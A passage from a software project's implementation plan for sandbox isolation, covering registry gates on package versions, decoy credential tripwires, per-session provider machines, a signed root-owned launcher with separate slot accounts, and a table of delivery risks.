- **Acceptance:** the runtime tests pass with `none` on the new path. The attach fixtures prove the bytes unchanged.
- **Tests:** the runtime tests in `internal/host`, with the `none` driver. The attach fixtures.
- **Docs:** `docs/explanation/architecture.md`.
- **CHANGELOG:** Changed. "Every new session, with or without a sandbox, now has a supervisor outside it."
- **Depends on:** P1.11, P2.10, and one release with walls on by default ([question 1](isolation-spec.md#15-open-questions)). The pull request says that the owner merges it only after that release.
- **Questions:** [1](isolation-spec.md#15-open-questions).
- **Effort:** M.

## Phase 7: deeper controls and scale

### P7.1 Registry gates in the egress process

- **Goal:** a graft from the registry firewall option. On intercepted registries, the proxy refuses three things:
  - Versions younger than `[network] min_release_age`, which is 7 days by default.
  - Versions in the OSV malicious-package feed.
  - Dependencies from git or tarball URLs.
- **The feed** comes with each release, or by `simstim host feed sync`, which the user starts.
- **Files:** new `internal/egress/registry.go`, new `internal/egress/rules/feed/` (the feed that each release carries), `internal/cli/host.go` (`host feed sync`).
- **Acceptance:** a version younger than the age is refused, with a hint. A version in the feed is refused. A dependency from a git URL is refused. Nothing fetches the feed unless a release carries it or the user starts a sync.
- **Tests:** unit tests with recorded registry answers.
- **Docs:** `docs/how-to/policy.md`.
- **CHANGELOG:** Added. "The proxy of a sandbox refuses package versions published in the last week, and known malicious packages."
- **Depends on:** P2.2.
- **Questions:** [20](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P7.2 Decoys

- **Goal:** decoy credential files in the sandbox's home, from data, whose values are tripwires in the egress process. Each decoy is in the docs, and `[sandbox] decoys = false` turns them off.
- **Files:** new `internal/guest/decoys.go`, new `internal/guest/decoys.toml` (data), `internal/egress/secrets.go` (the tripwires).
- **Acceptance:** a decoy's value sent to any host is refused and raises `secret_misuse`. `[sandbox] decoys = false` writes no decoy.
- **Tests:** unit tests.
- **Docs:** `docs/how-to/sandboxes.md` (each decoy), `docs/explanation/security.md`.
- **CHANGELOG:** Added. "Sandboxes hold decoy credential files, and a use of one raises an alert. `[sandbox] decoys = false` turns them off."
- **Depends on:** P2.3.
- **Questions:** none.
- **Effort:** S.

### P7.3 Observe terminal output

- **Goal:** spec 7.7: counts, the detach notice, and the XTVERSION warning.
- **Files:** `internal/client/attach.go`, new `internal/client/observe.go`.
- **Acceptance:** the attach tests prove the bytes unchanged with the observer on. The client never filters output: a guarded attach is not built ([question 26](isolation-spec.md#15-open-questions)).
- **Tests:** attach tests with the observer on. Unit tests of the counts.
- **Docs:** `docs/explanation/security.md`.
- **CHANGELOG:** Added. "After you detach, the client tells you when a session wrote to your clipboard or sent notifications that copy its own title."
- **Depends on:** P4.6.
- **Questions:** [26](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P7.4 A machine for each session

- **Goal:** `new --machine <provider>` makes one provider machine for the session. The helper runs there as a host, and the session runs inside at that machine's own floor. A supervisor and an egress process still sit outside the inner wall. The machine gets its provider's tier from H4: `shared` for E2B and other hosted providers ([question 32](isolation-spec.md#15-open-questions)).
- **Files:** `internal/cli/session.go` (`--machine`), `internal/client/machine.go`, `internal/client/provider.go`, `internal/provider/e2b/`.
- **Acceptance:**
  - `new --machine e2b` makes one machine, runs the session in a sandbox there, and removes the machine at `rm`.
  - A secret reaches the machine only as an exposed secret, recorded as such, and only when `[secret_tiers]` allows its tier ([question 22](isolation-spec.md#15-open-questions)).
  - On E2B, the task first tests whether P1.5 works inside E2B's guest, and records the result. Until a test passes, the floor there is the probe's answer.
- **Tests:** unit tests with the fake E2B provider in `internal/provider/e2b`. A run against E2B itself costs money, so it is a manual check for the owner.
- **Docs:** `docs/how-to/sandboxes.md`, `docs/how-to/create-a-host.md`.
- **CHANGELOG:** Added. "`new --machine <provider>` makes a machine at a provider for one session, runs the session in a sandbox there, and removes the machine when the session ends."
- **Depends on:** P1.11, H4, H5.
- **Questions:** [22](isolation-spec.md#15-open-questions), [32](isolation-spec.md#15-open-questions).
- **Effort:** L.

## Phase 8: separate accounts

These tasks come last ([question 27](isolation-spec.md#15-open-questions)). Separate accounts are an option in the first version. They become the default only after an outside review of the launcher.

### H17 Separate accounts, part 1: the root-owned launcher

- **Goal:** a signed, root-owned launcher that the login user may run through one sudo line. It upgrades itself only to a newer signed version (spec 14.4.6).
- **Files:**
  - New `cmd/launch/`, a static binary whose name comes from `internal/brand`, and `internal/brand/brand.go` (`LaunchBinary`).
  - `internal/client/rootstep.go` (the `launcher` step).
  - `internal/supply` (the launcher as an entry of the release manifest).
  - `go.mod` (`github.com/hiddeco/sshsig`).
  - New `docs/contributing/decisions/0043-separate-accounts-for-sandboxes.md`, and the records index.
- **Acceptance:**
  - The sudoers line allows no arguments.
  - The launcher refuses any request that fails its checks.
  - The launcher refuses a self-update that the release key of [0017](decisions/0017-release-signatures.md) did not sign, or that is not newer ([question 30](isolation-spec.md#15-open-questions)).
  - It checks signatures in Go, never with `ssh-keygen` ([question 38](isolation-spec.md#15-open-questions)).
  - An outside security review has read it. The pull request asks for the review, and the owner merges only after it.
- **Tests:** fuzz tests of the request parser. Tests that every refusal path ends without a change.
- **Docs:** `docs/how-to/give-a-host-the-root-step.md`. The record 0043.
- **CHANGELOG:** Added. "An optional root-owned launcher can start sandboxes under accounts of their own. `host prepare --root-step` installs it with one sudo line that allows no arguments."
- **Depends on:** H7, H9, P4.1. It adds the record 0043.
- **Questions:** [27](isolation-spec.md#15-open-questions), [30](isolation-spec.md#15-open-questions), [38](isolation-spec.md#15-open-questions).
- **Effort:** L.

### H18 Separate accounts, part 2: slot accounts and the root-owned store

- **Goal:** each sandbox runs as its own slot account, from a root-owned, read-only store.
- **Files:** `cmd/launch/`, `internal/host/` (the sandbox start calls the launcher when it is installed), `internal/client/rootstep.go` (the slot accounts and the store).
- **Acceptance:**
  - A process inside a sandbox's VMM runs as `simstim-sNN`. It cannot read the login user's home, and it cannot write the store.
  - The level's label says "own account".
  - Separate accounts stay an option, off by default ([question 27](isolation-spec.md#15-open-questions)).
- **Tests:** end to end, on a test host whose owner set `E2E_ROOT=run`. The test checks the uid of each VMM, and a write to the store fails.
- **Docs:** `docs/explanation/security.md`, `docs/how-to/give-a-host-the-root-step.md`.
- **CHANGELOG:** Added. "With the launcher installed, each sandbox runs as a slot account of its own, from a read-only store that root owns. A VMM escape then lands in that account, not in yours."
- **Depends on:** H17, P3.3.
- **Questions:** [27](isolation-spec.md#15-open-questions).
- **Effort:** L.

## Risks to the delivery

The design's own risks are in [spec 16](isolation-spec.md#16-risks-and-mitigations). These are the risks to the delivery itself.

| Risk | Mitigation |
| --- | --- |
| Stacked branches drift. A change to an early pull request after review means a rebase of every later branch. | Keep each task small. After the owner merges a pull request or asks for a change, rebase the later branches in order, and run the checks again on each. |
| Test host access. End-to-end tests need a host whose owner allowed them, and some tests need root or a reboot. | Use `hosttest` and VMs that the tests create and delete. Mark a check manual when it needs a reboot, a prompt, root without `E2E_ROOT=run`, or a paid provider. |
| Upstream pins move. Ghostty, Cloud Hypervisor, Firecracker, gVisor, Lima and the guest kernel may change between this plan and the task. | Each task checks its pin against the pinned release before it builds on it. P0.9 watches the pins from the start. An UNVERIFIED mark goes only after that check. |
| One maintainer reviews 83 pull requests, and accepts 15 decision records. | Each record lands with its first task, so the owner reviews it once. Each phase ends with something that users can use, so the owner can merge one phase and stop. |
| The spec and this plan drift apart. The folds rename some parts, such as P3.7's set-up command. | Each task corrects the spec in the same pull request when it builds a folded part. |
| Proposed records block the stack. A record that the owner rejects stops every later task that needs it. | Each pull request names its records. The owner can merge the tasks before a rejected record, and the implementer reworks the rest. |
| A model judge is slow or costly when many sessions run at once. | The fixed steps decide most flows without a judge. The rate limit, the 5 s timeout and the cache of answers for each session bound it. P2.12 measures it, and a local model costs nothing to call. |
| The two plans rename commands at the same time. | Every command of this plan follows 0033 from the start. [The CLI plan](cli-plan.md) renames only today's commands, with warned aliases. P1.8 waits for C2 and C4. |
| A shell beside the agent makes users trust the sandbox's files on the laptop. | Work still reaches the laptop only through `pull` and its review. `docs/how-to/shells.md` says so. |
